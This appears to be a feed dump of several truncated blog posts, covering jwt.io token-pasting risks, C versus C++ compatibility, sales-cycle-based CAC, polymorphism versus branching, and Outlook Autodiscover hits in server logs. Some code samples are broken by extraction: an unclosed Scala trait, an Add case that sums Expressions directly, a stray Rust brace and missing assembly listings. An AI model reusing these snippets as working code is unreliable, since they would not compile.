href="https://www.jvt.me/tags/blogumentation/">blogument it for later</a>. So I see that reaching for online tooling is more just because we've got folks who aren't aware of how they could do otherwise.</p><p>One great thing about removing the need for an online tool is that you can self-serve it once you have the tools locally. You can run it locally when you've got no internet (which isn't as much of an issue in these Coronavirus times) but also regardless of whether the upstream service is broken. You can use it with other i.e. command-line tooling, for instance how I've set up <a href="https://gitlab.com/jamietanna/dotfiles-arch/-/blob/master/terminal/home/bin/unpack">this command-line script</a> to handle a lot of common data formats I deal with and unpack them to a human-readable format.</p><p>But most importantly, by telling people to put sensitive data (such as credentials, configuration files, etc) it's a really dangerous lesson for our teams. We're teaching people to blindly trust arbitrary websites that they don't have any relationship with, nor have fully audited the source code, when posting potentially sensitive data.</p><p>I realise this may not be something you do when running it locally, but it's less likely for a well-known library running locally to need to reach outbound.</p><p>jwt.io is an interesting example, because although it boasts that it runs as a client-side solution, you may not have been aware that <a href="https://github.com/jsonwebtoken/jsonwebtoken.github.io/commit/b362ab19a9f37e337b5f8ea38987aa680aa6e0a9">until last September</a>, there were metrics being determined which although may have seemed innocent, show that it's easy for other functionality to be hidden in a seemingly client-side-only website. Unless you audit everything, every time, you're in a risky position where you may be leaking data you're not expecting to.</p><p>I feel that we can do something to help services that handle potentially sensitive data with helping educate the user that they should be more careful, because jwt.io's warning definitely doesn't help with folks who don't fully appreciate what the risk is if jwt.io isn't actually as trustworthy as the user thinks:</p><blockquote><p>Warning: JWTs are credentials, which can grant access to resources. Be careful where you paste them! We do not record tokens, all validation and debugging is done on the client side.</p></blockquote><p>What do you think? Am I maybe being a little too sensitive? Am I not being sensitive enough?</p><p>Edit: Based on some conversations being had in response to the post, I thought it'd mention I've written about how to <a href="https://www.jvt.me/posts/2019/06/13/pretty-printing-jwt-openssl/">pretty-print a JWT locally with OpenSSL</a> and <a href="https://www.jvt.me/posts/2018/08/31/pretty-printing-jwt-ruby/">a Ruby alternative</a>.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p><img src="https://cor3ntin.github.io/posts/c/fight.jpeg" alt="Fish"></p>
<p>In the early 70s, C was created at Bell Labs as a byproduct of the development of UNIX.
It quickly became one of the most popular programming languages.
But it was not expressive enough for Bjarne Stroustrup.
And so, in 1983, as a byproduct of his Ph.D. thesis, he extended C.</p>
<p>C with classes was born.</p>
<p>At the time, Bjarne Stroustrup understood that a programming language has many components,
not only the language, its compiler, but also a linker and libraries.
Offering a familiar tool also makes adoption easier.
In this historical context, it makes sense that C++ would be based on C.</p>
<p>Fast-forward 40 years later.</p>
<p>Both C and C++ are widely used in the industry.
But go 5 minutes on the Internet and C developers will tell you that C++ is the most horrific man-made creation,
while many C++ developers wait for the day when C finally burns in the hot flames of hell.</p>
<h2 id="so-what-happened">So what happened?</h2>
<p>On the surface, C and C++ cater to the same use cases: high performance, deterministic, native but portable code for the widest range of hardware and applications.</p>
<p>But C is proudly a low-level language. A nicer assembly.</p>
<p>From day one, C++ had magic. Dark witchcraft: destructors. Suddenly the compiler was doing things on its own.
It also had type inference very early on, but the developers of the mid-80s were not quite ready for that and Bjarne Stroustrup
was pressured into removing <code>auto</code>, until it was added back to C++11.</p>
<p>From then, C++ got more and more tools to build abstractions.
I don’t think it would be fair to say that C++ is a low-level or high-level language. It’s both, by design.
But building high-level abstractions while not sacrificing performance is hard.
C++ then needed tools to achieve that: <code>constexpr</code>, move semantics, templates, and an ever-growing standard library.</p>
<p>Fundamentally I think C trusts developers while C++ trusts compilers.
This is a massive difference that sharing the same native types or syntax for while loop cannot hide.</p>
<p>C++ developers blame C for all their lost limbs, while C developers probably think C++ is batshit crazy.
I imagine that is a fair perspective if you look at C++ through a C lense. C++ is pretty wild <em>as a superset of C</em>.
A seasoned C person looking at C++ expecting familiarity in C++ will not find it. C++ is not C.
This is enough to feed flamewars for generations.</p>
<p>But as much as I dislike C, I don’t have any legitimacy to make fun of it. See, I have some experience with C++ but I
wrote very little C. It was probably bad C.
A language is also its good practices, patterns, idioms, and these take years to learn. If you try to write C code like it’s C++ or C++ like it is C, you will have a bad time.
Knowing <a href="https://www.youtube.com/watch?v=YnWhqhNdYyk">C doesn’t teach you C++</a>. Knowing C++ does not teach you C.</p>
<p>So can we all stop saying C/C++, regret the unfortunate naming, and sing kumbaya in harmony?
Not so fast.</p>
<p>See, despite being philosophically different from C, C++ is still somewhat a superset of C.
That is to say, you can include a C header in a C++ translation unit and that should compile.
And this is where it gets messy.</p>
<p>C++ is not an extension of C.
It is designed as a separate standard, by a different committee, different people.
Logically, people who like C++'s philosophy will get involved in the C++ community and the C++ standardization process
while other people might try to get involved with C.
Committees, whether its C’s or C++'s, only manifest intent and direction through their respective end-product: the standards; standards which are the fruits of numerous voting.</p>
<p>At the same time, it is difficult for a compiler to know that it is dealing with a C header or a C++ header.</p>
<p><code>extern "C"</code> is not used consistently and only affects mangling, but neither grammar nor semantics.
And headers only exists in the eyes of the preprocessor, for a C++ compiler, everything is a C++ translation unit, and therefore C++.
And yet, people include C headers in C++ and expect it to “just work” ™️.
Which it mostly does.</p>
<p>We can wonder then,</p>
<h2 id="how-c-maintains-c-compatibility-while-being-developed-by-different-people-in-different-places">How C++ maintains C compatibility while being developed by different people in different places?</h2>
<p>Badly, I’m afraid.</p>
<p>A coworker recently reminded me of Conway’s law:</p>
<blockquote>
<p>Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure</p>
</blockquote>
<p>By that logic, it would stand to reason that if the two committees don’t interoperate,
neither would the languages they produce.</p>
<p>C++ maintains a list of <a href="http://eel.is/c++draft/diff.iso">incompatibilities with C</a> and <a href="http://eel.is/c++draft/diff.library">its standard library</a>.
This list does not seem to reflect the many features that were added to C11 and C18 but are not valid C++ constructs. <a href="https://en.wikipedia.org/wiki/Compatibility_of_C_and_C%2B%2B">Wikipedia</a> draws a clearer picture.</p>
<p>Listing incompatibilities isn’t sufficient to get a measure of incompatibilities between both languages.</p>
<p>Functions that exist in the C++ standard library but whose primary declaration is expected to come from C are difficult to make <code>constexpr</code>, and more difficult still to make <code>noexcept</code>.
C compatibility translates to performance costs and C functions are optimization barriers.</p>
<p>Many C constructs are valid C++ but should never pass a code review (<code>NULL</code>, <code>longjmp</code>, <code>malloc</code>, create/destroy functions, <code>free</code>, C  casts), etc.</p>
<p>These might not be bad C idioms, but they are bad C++. C++ has a stronger type system,
and unfortunately using C idioms punch a giant hole in that type system, and so C compatibility has a cost in terms of safety.</p>
<p>Don’t get me wrong, C++ still care about C compatibility. Somewhat.
And interestingly C cares about C++. Somewhat.
Truth be told, C might care about C++ more than C++ cares about C.
So each committee cares somewhat about what the other does.
We care reluctantly.</p>
<p>See, C++ is aware of the many foundational libraries written in C, not only the <code>libc</code> but also <code>zip</code>, <code>png</code>, <code>curl</code>, <code>openssl</code> (!), and countless others, which are used in many, many C++ projects.
We can’t break that.</p>
<p>But recently, especially over the past decade, C++ has become much bigger than C.
C++ has more users - and a much more active community: <a href="https://nullprogram.com/blog/2018/11/21/">There Are No C Conferences</a>.
Maybe that’s why the C++ committee is now over 10 times the size of the C committee.</p>
<p>C++ then is a force to be reckoned with and the C committee has to consider not breaking C++.
To the point that if a standard would track another, these days, C++ leads and C follow.</p>
<p>C++ is now on a steady three years cycle come rain or shine, or deadly pandemics.
Meanwhile, C has a major release every decade or so.
This makes sense. As a lower-level language, C doesn’t need to evolve as fast.</p>
<p>The C landscape is also rather different from the C++ landscape.
C caters to more platforms and a lot more compilers.
Everybody and their dog is writing C compilers because the language has a surface area small enough to make that possible, whereas the C++ committee will only really consider 4 implementations, all of which are represented at every meeting.
As a result, many features in C are implementation-defined or optionally supported so that the variety of compilers that exist can claim conformance without doing much work, which I’m told pleases regulatory bodies.</p>
<p>C++ these days is more interested in portability than implementation freedom. Yet another difference of philosophy.</p>
<h2 id="so-your-proposal-breaks-c-compatibility">So, your proposal breaks C compatibility</h2>
<p>Parts of my <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2020/p2178r1.pdf">P2178</a> paper theoretically affects C compatibility.
In such cases, none of the options seems satisfactory.</p>
<p>You could be told that you have to first get your feature into C. Which means more meetings.
Meetings you might not be able to attend because C has strict <a href="https://thephd.github.io/follow-the-river-wg14-ithaca-2019">attendance rules</a> - Excluding individuals not willing to put down thousands of dollars to become ISO members.
This is because the C committee is forced to adhere strictly to ISO rules.</p>
<p>It might also take a decade if the standard just shipped.
And most importantly, it might go nowhere if the C committee doesn’t understand or doesn’t care about the particular problem you are trying to solve.
And they probably don’t have the bandwidth to deal with it.
And you may not have the bandwidth to deal with C. After all, you joined C++ to improve C++.
In fact, if the room invites you to “talk to the C committee”, it is likely your proposal is dead, even in the unlikely event that no one in the room was against it.</p>
<p>Another likely scenario is that the C committee accepts a version of a proposal that is slightly different from what exists in C++.
<code>true</code>? Let’s make that a macro. <code>char16_t</code> ? Let’s make that a typedef. <code>char32_t</code>? Not necessarily UTF-32. <code>static_assert</code> ? <code>_Static_assert</code>.</p>
<p>The list goes on. Should we blame C? Probably not. Their committee does what they think is best for their language.
The opposite is true too. In C++20 designated initializers were inspired by C’s but are slightly different because they would otherwise not fit with the C++ initialization rules.</p>
<p>I am part of the problem. C has VLAs. I would vote against a proposal to adopt that in standard C++, <a href="https://www.phoronix.com/scan.php?page=news_item&amp;px=Linux-Kills-The-VLA">too many security issues</a>. A proposal to add <code>_Generic</code> to C++ would be over-my-dead-body. I am not sure if <code>_Generic</code> attempts to palliate to the lack of template or the lack of overloads, but C++ has both these features - from my point of view <code>_Generic</code> doesn’t fit into the big picture of what I imagine C++ to be.</p>
<p>Both committees seem also inconsistent in how much they care about the other language.
Sometimes we go to great lenghts (<a href="https://en.cppreference.com/w/cpp/numeric/complex">std::complex</a>), sometimes we don’t care at all (<a href="https://en.cppreference.com/w/c/language/array">static array parameters</a>).</p>
<p>There is no way around this. Don’t forget that each committee is a bunch of people
voting at different times in different rooms and trying to control the outcome would defeat the purpose
of having a vote.
Putting people in the same room is not realistic either. ISO might object and the participation inbalance
would put C people at an enormous disadvantage.</p>
<h2 id="c-compatibility-doesnt-matter-kinda">C compatibility doesn’t matter, kinda</h2>
<p>If you are a C developer, I imagine you see C as a neat programming language.
But for the rest of us, C is something else.</p>
<p>C is the universal, cross-language glue that ties it all together.</p>
<p>For C++ users, C is …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Note:&nbsp;this was originally published at </em><a href="https://alexoppenheimer.substack.com/" target="_blank"><em>https://alexoppenheimer.substack.com/</em></a></p><p>Generally accepted accounting principles were designed to create a single standard for comparing any and all businesses using the same terms and metrics. This is a very powerful tool, but it is a clear exchange for breadth over specificity. As a result, the economic reality of a business will likely differ from what the accounting metrics represent. By looking at a subset of business models, we can improve specificity - terms like <em>ARR </em>and <em>GMV</em> are both examples of this. While these terms have their own challenges with definitions, I think most agree what they represent: ARR is annualized recurring revenue for SaaS companies, and GMV is gross merchandise/marketplace value for marketplace companies.</p><p>One of my favorite examples of this is CAC - customer acquisition cost. It’s relevant for both SaaS businesses and marketplaces. Average CAC is the cost to acquire a single customer and Total CAC is the full spend for a cohort of customers. So what is the difference between <strong>CAC</strong> and <strong>Sales &amp; Marketing</strong> expense? The truth is that Total CAC and S&amp;M over a given period of time <em>might </em>be the same. That being said, the usually differ by a <em>time offset </em>that depends on <strong><em>sales cycle length</em></strong>.</p><p>The critical distinction is <strong>sales cycle length</strong>. <em>Sales cycle is how long it takes for a customer to go from first contact to closing a deal</em>. We measure sales cycle by segment and can use simple reports in Salesforce or another CRM tool to figure out how long it takes on average for customers to move through the sales funnel. Generally sales opportunities begin as leads, some of those convert to <em>qualified for sales</em> and then some of those convert to <em>closed-won</em>. The Sales Funnel shows the volume and conversion at each step in the process and is usually in the hands of the CRO or sales operations team. The two lengths of time that we care about in finance are: top of funnel to sales qualification (i.e. marketing cycle length) and then sales qualification to closed-won (i.e. sales cycle length).</p><p>There is a large variance in sales cycle lengths from business to business. For example, consumer software might have a &lt;1 month sales cycle that runs entirely on marketing. On the other end of the spectrum, a complex sale to a large institution may take over a year and involve a number of different people and teams.</p><p>For the in-month sales cycle, New ARR in Month X will be attributed to the Marketing expense in Month X. Pretty straightforward.</p><p>As soon as you have a separate marketing funnel and sales funnel and things take longer than a few weeks, it becomes more complicated to measure, track and predict.</p><p>I often see operating stats that look like this:</p><figure id="w-node-be6f6b2d374d-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f4e9f755f630ab3e0e98ebd_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F79d18d99-150c-4eae-b10a-cc00916f9da3_1168x196.png" alt=""></p></figure><p>‍</p><p>The high level sales efficiency metric is New ARR / S&amp;M: the idea being that we are investing in S&amp;M in order to generate new ARR. The missing piece of information here is <strong>how long are the customers in the marketing funnel and how long are they in the sales funnel</strong>. Without that info, people often assume that it is in the same time period - whether that is a month, a quarter or a year. Switching over to a CAC calculation based on sales cycle length gives a more accurate picture of the sales efficiency.<br></p><p>For example: let’s say the marketing funnel takes <strong>1 month</strong> and the sales funnel takes <strong>3 months</strong>.<br></p><p>As a result, CAC would be the Marketing expense from 3 months prior and the average of the Sales expense over the last 3 months. So in the above example, new ARR acquired in April would be associated with the Marketing spend in January and the average of the Sales spend in Feb, March and April. Because this is a growing business, CAC will be lower than the S&amp;M in the same month, meaning that efficiency numbers are actually higher when based on CAC. Quick note to operating executives: don’t use a basic formula and sell yourself short.<br></p><p>Now looking at it through the lens of sales cycle-dependent CAC:<br></p><figure id="w-node-5b3f68252472-51d2da99"><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f4e9f8ca3a860067d1d36b8_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Fce0d6249-9d70-4cff-87bb-36004dfe03c8_1168x278.png" alt=""></p></figure><p>‍</p><p>Once you have the CAC line in the model, you can use it for SaaS Magic number, CAC payback, and a number of other metrics. (Of course, as the sales cycle changes, the CAC calculation must also change.) These metrics are important because they usually stay constant for a given product and business operation and allow you to project into the future.</p><p>The CAC calculation gets you one level deeper towards operating metrics from the high level financial metrics and is often a good bridge between the two. It represents the detailed funnels at a high level, and will ultimately drive projections with a higher degree of accuracy. For example, we now know that leads acquired through marketing spend in December will not yield sales until 3 months later in March. Based on historical metrics, we know roughly how many leads this spend will get us and therefore what kind of sales capacity we need to close on those leads and can plan sales hiring accordingly.<br></p><p>Coming from the financial perspective down into the operating perspective is a bit of a rabbit hole, so there’s an art in knowing where to stop, and it’s usually the point where precision starts to overtake accuracy in the model and digging deeper stops yielding better results. One step down from this, for example, would be to look into the sales expense - sales people are generally paid 50%+ of their total salary in commissions. If those commissions are paid in the month of sale, half of the sales expense should be weighted from that month and the other half weighted across the earlier months. If sales people are paid later on, then looking at it from a purely economic perspective as it pertains to commission rates will yield a much better result than looking at the accounting outputs for sales expense.<br></p></div></div>]]>

  <p>Recently I came across a <a href="https://levelup.gitconnected.com/if-else-is-a-poor-mans-polymorphism-ab0b333b7265">blog post</a>
whose author claims, from the perspective of good coding practices, polymorphism is strictly superior to branching. 
In the post they make general statements about how branching statements lead to unreadable, unmaintainable, inflexible code and
how they are a sign of immaturity. However, in my opinion, the topic is much deeper and in this post 
I try to objectively discuss the reasons for and against branching.</p>

<!--more-->



<p>Before I dive into polymorphism vs branching dilemma, let’s first define what we mean when we say some code is
flexible and easy to extend. In my career I reviewed thousands of lines of code, and I had thousands of lines of my code
reviewed by others, and during these reviews it often occured that the terms <em>code extensibility</em> or <em>flexibility</em> 
mean different things to different people. Familiarity with the code-base or particular programming style plays a huge role.</p>

<p>For example, someone used to writing code in a Java/C# OOP style would generally consider dynamic polymorphism through 
interfaces a standard way of providing extensibility to the code, 
while a C programmer may find a switch or if/else much more 
approachable than OOP. There are also many other factors related 
to maintainability as quality of documentation, good naming, separation of concerns, etc. These factors are orthogonal 
to the “polymorphism vs branching” dimension and also far too broad for a single blog post, so I won’t discuss them.</p>

<p>For the sake of this post, let’s define <em>extensibility</em> as the inverse of number of distinct units in the codebase
that need to be changed in order to implement a new feature. The more places you have to touch to implement the feature, 
the harder the code is to change. Obviously, it is much better when you have to touch only
one unit of code (one function, one class, one module, one package) rather than change 10 distinct unrelated units.</p>


<p>Imagine you’re writing a calculator. Your program gets an expression as an input and outputs the computed value.
For example the user inputs <code>1 + 2 * 3</code> and the output is <code>7</code> 
(or <code>9</code> if you’ve messed up the operator precedence like one of my former CS students).</p>

<p>Why such a silly example? Who is writing calculators these days? Probably no-one, but this looks like a classic example given
in many programming classes. And it is easy enough to illustrate the concept.</p>

<p>How can we model a structure to represent an expression?
You’d probably use classes or structures. Here is the code in Scala:</p>

<div><div><pre><code><span>trait</span> <span>Expression</span> <span>{</span>
    <span>def</span> <span>eval</span><span>:</span> <span>Double</span>
<span>}</span>

<span>case</span> <span>class</span> <span>Const</span><span>(</span><span>value</span><span>:</span> <span>Double</span><span>)</span> <span>extends</span> <span>Expression</span> <span>{</span>
    <span>def</span> <span>eval</span><span>:</span> <span>Double</span> <span>=</span> <span>value</span>
<span>}</span>

<span>case</span> <span>class</span> <span>Add</span><span>(</span><span>left</span><span>:</span> <span>Expression</span><span>,</span> <span>right</span><span>:</span> <span>Expression</span><span>)</span> <span>extends</span> <span>Expression</span> <span>{</span>
    <span>def</span> <span>eval</span><span>:</span> <span>Double</span> <span>=</span> <span>left</span><span>.</span><span>eval</span> <span>+</span> <span>right</span><span>.</span><span>eval</span>
<span>}</span>
</code></pre></div></div>

<p>Then it is quite easy to build an expression and evaluate it:</p>
<div><div><pre><code><span>Add</span><span>(</span><span>Const</span><span>(</span><span>2</span><span>),</span> <span>Const</span><span>(</span><span>3</span><span>)).</span><span>eval</span> <span>// evaluates to 5 </span>
</code></pre></div></div>


<p>This OOP-based solution is indeed very extensible when it comes to add a new operator.
The example above is missing subtraction operation. We can add one by defining a new class:</p>

<div><div><pre><code><span>case</span> <span>class</span> <span>Sub</span><span>(</span><span>left</span><span>:</span> <span>Expression</span><span>,</span> <span>right</span><span>:</span> <span>Expression</span><span>)</span> <span>extends</span> <span>Expression</span> <span>{</span>
    <span>def</span> <span>eval</span><span>:</span> <span>Double</span> <span>=</span> <span>left</span><span>.</span><span>eval</span> <span>-</span> <span>right</span><span>.</span><span>eval</span>
<span>}</span>
</code></pre></div></div>

<p>That’s really awesome – we didn’t have to touch any old code at all! 
OOP definitely rocks here.</p>


<p>Imagine you continued to extend our calculation engine with more operation classes over the next few years.
You’ve added multiplication, division, modulo, variables, logarithms, trigonometric functions, etc.</p>

<p>Then suddenly a new requirement comes – users want to not only evaluate the value of an expression,
but also do symbolic manipulation – e.g. simplify expressions. For example, given an expression
<code>a + a</code> they want to get an expression <code>2 * a</code> as a result.</p>

<p>This requirement can’t be captured by the <code>eval</code> method on the <code>Expression</code> interface. We need a new method:</p>

<div><div><pre><code><span>trait</span> <span>Expression</span> <span>{</span>
    <span>def</span> <span>eval</span><span>:</span> <span>Double</span>
    <span>def</span> <span>simplify</span><span>:</span> <span>Expression</span>
<span>}</span>
</code></pre></div></div>

<p>And as the next step, they would likely want to be able to display the expression as a String:</p>

<div><div><pre><code><span>trait</span> <span>Expression</span> <span>{</span>
    <span>def</span> <span>eval</span><span>:</span> <span>Double</span>
    <span>def</span> <span>simplify</span><span>:</span> <span>Expression</span>
    <span>def</span> <span>toString</span><span>:</span> <span>String</span>
<span>}</span>
</code></pre></div></div>

<p>How many units of code do you have to change now to implement these features?
<strong>All the implementations of <code>Expression</code></strong>. Before touching all the classes, the code wouldn’t even compile.
It looks like in the context of this kind of feature, our polymorphic solution is terribly non-extensible.</p>


<p>Let’s take a step back and let’s see how we could implement this differently.
Scala and many other modern languages have a feature called <em>pattern matching</em>
which can be considered a very flexible, powerful switch.</p>

<p>Instead of defining the operations like <code>eval</code> or <code>simplify</code> on the case classes,
let’s pull them up:</p>

<div><div><pre><code><span>trait</span> <span>Expression</span> <span>{</span>
<span>case</span> <span>class</span> <span>Const</span><span>(</span><span>value</span><span>:</span> <span>Double</span><span>)</span> <span>extends</span> <span>Expression</span>
<span>case</span> <span>class</span> <span>Add</span><span>(</span><span>left</span><span>:</span> <span>Expression</span><span>,</span> <span>right</span><span>:</span> <span>Expression</span><span>)</span> <span>extends</span> <span>Expression</span>


<span>def</span> <span>eval</span><span>(</span><span>e</span><span>:</span> <span>Expression</span><span>)</span><span>:</span> <span>Double</span> <span>=</span> <span>{</span>
  <span>e</span> <span>match</span> <span>{</span>
    <span>case</span> <span>Const</span><span>(</span><span>x</span><span>)</span> <span>=&gt;</span> <span>x</span>
    <span>case</span> <span>Add</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>)</span> <span>=&gt;</span> <span>a</span> <span>+</span> <span>b</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Now adding a new operation like <code>Sub</code> would require two changes to the code – adding a new class
<em>and</em> adding a new case in the match (switch) statement.</p>

<p>Some may say this much worse not only because of more places to update, but because of a possibility of
forgetting to update the switches which could lead to runtime errors due to unhandled cases.
Fortunately, Scala designers thought about this by providing the <code>sealed</code> keyword, which instructs the compiler
that all case classes can be defined in the same module only. This unlocks pattern exhaustiveness analysis and the
compiler would warn about missing cases:</p>

<div><div><pre><code><span>sealed</span> <span>trait</span> <span>Expression</span>
<span>case</span> <span>class</span> <span>Const</span><span>(</span><span>value</span><span>:</span> <span>Double</span><span>)</span> <span>extends</span> <span>Expression</span>
<span>case</span> <span>class</span> <span>Add</span><span>(</span><span>left</span><span>:</span> <span>Expression</span><span>,</span> <span>right</span><span>:</span> <span>Expression</span><span>)</span> <span>extends</span> <span>Expression</span>

<span>def</span> <span>eval</span><span>(</span><span>e</span><span>:</span> <span>Expression</span><span>)</span><span>:</span> <span>Double</span> <span>=</span> <span>{</span>
  <span>e</span> <span>match</span> <span>{</span>
    <span>case</span> <span>Const</span><span>(</span><span>x</span><span>)</span> <span>=&gt;</span> <span>x</span>
    <span>case</span> <span>Add</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>)</span> <span>=&gt;</span> <span>a</span> <span>+</span> <span>b</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>What about adding new functions like <code>simplify</code> or <code>toString</code>? 
It requires to changle only <strong>one place</strong> – by adding the required methods. 
No changes to the existing code are needed!</p>

<div><div><pre><code><span>def</span> <span>simplify</span><span>(</span><span>e</span><span>:</span> <span>Expression</span><span>)</span><span>:</span> <span>Expression</span> <span>=</span> <span>{</span>
  <span>e</span> <span>match</span> <span>{</span>
    <span>case</span> <span>Add</span><span>(</span><span>Const</span><span>(</span><span>0</span><span>),</span> <span>x</span><span>)</span> <span>=&gt;</span> <span>x</span>
    <span>case</span> <span>Add</span><span>(</span><span>x</span><span>,</span> <span>Const</span><span>(</span><span>0</span><span>))</span> <span>=&gt;</span> <span>x</span>
    <span>case</span> <span>other</span> <span>=&gt;</span> <span>other</span>
  <span>}</span>
<span>}</span>

<span>def</span> <span>toString</span><span>(</span><span>e</span><span>:</span> <span>Expression</span><span>)</span><span>:</span> <span>String</span> <span>=</span> <span>{</span>
  <span>e</span> <span>match</span> <span>{</span>
    <span>case</span> <span>Const</span><span>(</span><span>x</span><span>)</span> <span>=&gt;</span> <span>x</span><span>.</span><span>toString</span>
    <span>case</span> <span>Add</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>)</span> <span>=&gt;</span> <span>"("</span> <span>+</span> <span>toString</span><span>(</span><span>a</span><span>)</span> <span>+</span> <span>" + "</span> <span>+</span> <span>toString</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>"</span><span>)</span> 
  <span>}</span>
<span>}</span>
</code></pre></div></div>


<p>The blog post I mentioned in the introduction stated that using polymorphism instead of
branching leads to more readable code. I find this statement far too general and actually very debatable.</p>

<p>First, even in their own example given by the author of that blog, the solution using branching was a lot
shorter and less complex than the solution using OOP. While brief code is not always more readable than a longer version of it,
in that case, I found branching to be very explicit and easy to follow. 
It is much easier to understand the control flow
in such a program because all targets are explicitly given in a single place. In the OOP solution, 
the actual implementations are hidden behind the interface and it is much harder to find them all without additional 
help of a good IDE with a “jump to implementations” feature 
(which fortunately often works well for statically typed languages, but I’ve seen IDEs sometimes 
struggle with dynamic languages like Python).</p>

<p>Second, in general case, branching has an advantage that the function logic may depend on more than
one object type or even the actual data. For example, in the example from this post, 
the transformation <code>a * (b + c)</code> =&gt; <code>a * b + a * c</code> would depend on 
both addition and multiplication. In the classic OOP solution, would you place it in the <code>Add</code> or in the <code>Mul</code> class? 
Neither seems right. Also, putting it into one of them creates a dependency on the other one. 
An expression simplifier with code scattered accross multiple classes heavily depending on each other 
would be hard to understand.</p>


<p>This is a blog on high performance programming, so the post would be incomplete without a 
section on performance. In theory, a sufficiently good compiler should produce the same
code regardless of the choice between branching or dynamic polymorphism, but is this the case in reality?
Compilers have limitations and often don’t generate the best result code possible.</p>

<p>Let’s consider a more realistic example this time.
Some time ago I was working on serializing/deserializing code in a database system.
I stumbled upon a set of classes that described data types. They all implemented 
a common interface defining methods for serializing and deserializing values of given data type
and also computing serialized data lenghts. The following Rust snippet is a huge simplification 
of that code, but it illustrates the concept:</p>

<div><div><pre><code><span>pub</span> <span>trait</span> <span>DataType</span> <span>{</span>
    <span>fn</span> <span>len</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>usize</span><span>;</span>
<span>}</span>

<span>impl</span> <span>DataType</span> <span>for</span> <span>BoolType</span> <span>{</span>
    <span>fn</span> <span>len</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>usize</span> <span>{</span> <span>1</span> <span>}</span>
<span>}</span>

<span>impl</span> <span>DataType</span> <span>for</span> <span>IntType</span> <span>{</span>
    <span>fn</span> <span>len</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>usize</span> <span>{</span> <span>4</span> <span>}</span>
<span>}</span>

<span>}</span>

<span>pub</span> <span>fn</span> <span>data_len</span><span>(</span><span>data_type</span><span>:</span> <span>&amp;</span><span>dyn</span> <span>DataType</span><span>)</span> <span>-&gt;</span> <span>usize</span> <span>{</span>
    <span>data_type</span><span>.len</span><span>()</span>
<span>}</span>
</code></pre></div></div>

<p>Given a reference to a <code>DataType</code> object, it is trivial to compute the data size associated with it, 
without knowing the exact static type:</p>

<div><div><pre><code><span>let</span> <span>t1</span> <span>=</span> <span>IntType</span><span>;</span>
<span>let</span> <span>t2</span> <span>=</span> <span>LongType</span><span>;</span>
<span>let</span> <span>v</span><span>:</span> <span>Vec</span><span>&lt;&amp;</span><span>dyn</span> <span>DataType</span><span>&gt;</span> <span>=</span> <span>vec!</span><span>[</span><span>&amp;</span><span>t1</span><span>,</span> <span>&amp;</span><span>t2</span><span>];</span>
<span>println!</span><span>(</span><span>"{}"</span><span>,</span> <span>data_len</span><span>(</span><span>v</span><span>[</span><span>0</span><span>]));</span>  <span>// prints 4</span>
<span>println!</span><span>(</span><span>"{}"</span><span>,</span> <span>data_len</span><span>(</span><span>v</span><span>[</span><span>1</span><span>]));</span>  <span>// prints 8</span>
</code></pre></div></div>

<h2 id="performance-of-dynamic-dispatch">Performance of Dynamic Dispatch</h2>

<p>The implementation of the <code>data_len</code> function is actually very simple:</p>


<p>Wow! A single assembly instruction! 
It jumps to the address stored in the the vtable of the object pointed by the <code>rsi</code> register.
The target of the jump depends on the actual type of the object. Here is the code generated for <code>IntType.len</code>:</p>



<p>The codes for the other types differ only in the constant value.</p>

September 2, 2020 | https://lolware.net/2020/09/02/autodiscover-circus.html | <a href="https://web.archive.org/web/*/https://lolware.net/2020/09/02/autodiscover-circus.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <div itemprop="articleBody">
                    <div>
                        

<p>It's fairly common for an organisation's website to exist outside the organisation's operational security policies. There's a common justification that for many organisations, the website is a marketing landing page and no sensitive data is ever involved. This in turn oftens leads to the prevance of, for example, shared hosting companies holding dozens of compromised Wordpress sites at a time.</p>

<p>We regularly see this when major businesses are compromised. This is unfortunate.</p>



<p>Anyone who has read the web access log on such a server has probably found themselve Googling what autodiscover.xml is. Here's an example from my own server, of something which may be rare if you have a few users. I grepped an larger organisation's log and found around 1200 hits per day.</p>
<div><pre><code data-lang="">020/09/02 05:54:40 [error] 385#385: *33613 open() "/var/www/html/autodiscover/autodiscover.xml" failed (2: No such file or directory),
    client: 1.2.3.4, server: lolware.net, request: "POST /autodiscover/autodiscover.xml HTTP/1.1", host: "lolware.net"
</code></pre></div>
<p>The reason for this is Microsoft's Autodiscover mechanism. And it's worth noting that while I'm going to talk about Outlook, many mail clients support autodiscover with varying rules and process.</p>

<p>Microsoft have a good technical brief here: <a href="https://support.microsoft.com/en-au/help/3211279/outlook-2016-implementation-of-autodiscover">https://support.microsoft.com/en-au/help/3211279/outlook-2016-implementation-of-autodiscover</a>.</p>

<p>As you can see, step six of the discovery processis "check the root domain". And that tends to be a step that's hit before the issue is settled, usually at step 7 or step 9. You can also see described the triggers and schedules for autodiscover.</p>

<p>A more practical, and digestable article for people not often working with Office 365 can be seen here: <a href="https://practical365.com/exchange-server/fixing-autodiscover-root-domain-lookup-issues-mobile-devices/">https://practical365.com/exchange-server/fixing-autodiscover-root-domain-lookup-issues-mobile-devices/</a>.</p>

<p>I quite like this article as the reference to the web hosting circus will be quite familiar to anyone who has had to support the average shared hosting environment. Those people will be familiar with how common hacked websites are.</p>



